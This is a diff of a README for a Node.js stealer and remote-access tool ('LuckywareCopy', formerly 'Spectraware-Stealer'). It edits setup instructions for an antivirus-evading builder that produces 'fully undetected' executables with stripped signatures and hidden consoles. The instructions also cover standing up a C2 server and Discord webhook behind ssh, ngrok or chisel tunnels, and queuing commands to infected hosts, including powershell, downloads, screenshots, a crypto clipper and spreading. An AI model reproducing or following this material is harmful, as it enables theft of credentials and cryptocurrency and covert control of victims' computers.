@@ -1,11 +1,4 @@
-# Spectraware-Stealer
-Fud Stealer / Spectraware fully undetected stealer
-
-
-
-
-
-#  Spectraware — no-website copy, 2x Luckyware FUD 
+# LuckywareCopy — no-website copy, 2x Luckyware
 
 JS copy (Node 18+, zero dependencies). No website / DB needed.
 
@@ -30,7 +23,7 @@ JS copy (Node 18+, zero dependencies). No website / DB needed.
    - 80–200 fresh junk functions, shuffled top-level function order, random overlay
    - result: fresh SHA256, fresh strings, fresh AST shape. Scan ONE build at a time; never upload all builds to one scanner.
 
-FUD is probabilistic — hygiene matters: unique webhook/C2 per campaign, unique exename, `pkg` exe only for final build, stagger scans for the fully undetected stealer.
+FUD is probabilistic — hygiene matters: unique webhook/C2 per campaign, unique exename, `pkg` exe only for final build, stagger scans.
 
 ## Layout
 
@@ -48,14 +41,18 @@ LuckywareCopy/
 
 ## Quickstart
 
-1. Copy config: `copy config.example.json config.json` and fill `DISCORD_WEBHOOK`, `C2_URL`, `CLIPPER`, `OWNER_KEY`. To point the helper dropper at your own mirror, add `"DROP_URL": "https://your-c2/builds/yourbinary.exe"` — the binary behind it is swappable server-side without rebuilding.
+1. Copy config: `copy config.example.json config.json` and fill `DISCORD_WEBHOOK`, `C2_URL`, `CLIPPER`, `OWNER_KEY`.
 2. Start C2: `node src/c2.js --port 8080 --webhook https://discord.com/api/webhooks/...`
 3. Portforward (pick one):
    - `ssh -R 8080:localhost:8080 user@your-vps`
    - `ngrok http 8080`
    - `chisel server --port 8080` / `chisel client http://vps:8080 R:8080:localhost:8080`
    - set `C2_URL` to the public URL before building.
-4. Build 1+ unique implants: `node src/builder.js --config config.json --out builds/bot --count 3`
+4. Build 1+ unique FUD exes — **always use `--sea --sealed`** (this is the FUD path: official `node.exe` + AES-sealed implant injected as a resource, signature stripped, GUI subsystem = no console flash). Without `--sea` you only get plaintext `.js`:
+   ```
+   node src/builder.js --config config.json --out builds/bot --count 3 --sea --sealed
+   ```
+   First run downloads official `node.exe` (~70MB, cached in `builds/.seabase`) — `npx postject` + `unzip` must be available. Outputs land at `builds/bot-<rand>.exe`.
 5. Queue task: `curl -X POST http://localhost:8080/admin/task -H "Content-Type: application/json" -d "{\"hwid\":\"all\",\"type\":\"exc\",\"arg\":\"whoami\"}"`
    Types: `exc` cmd, `ps` powershell, `download` url, `screenshot`, `clip` json, `infect`, `proxy`.
 6. Test: `npm test`
@@ -65,7 +62,7 @@ LuckywareCopy/
 1. Webhook + C2 URLs + mode (`both` recommended)?
 2. Clipper payout addresses (8 coins)?
 3. Beacon interval + which steal/spread modules on/off?
-4. Exe needed (`pkg` to node18-win-x64) or `.js` + `node` runner is fine?
+4. Exe needed? Always build with `--sea --sealed` (FUD). `pkg` (`--exe`) is a fallback — it leaves a `pkg`-specific overlay structure some engines fingerprint.
 
 ## Map to Luckyware (for src rewriting)
 
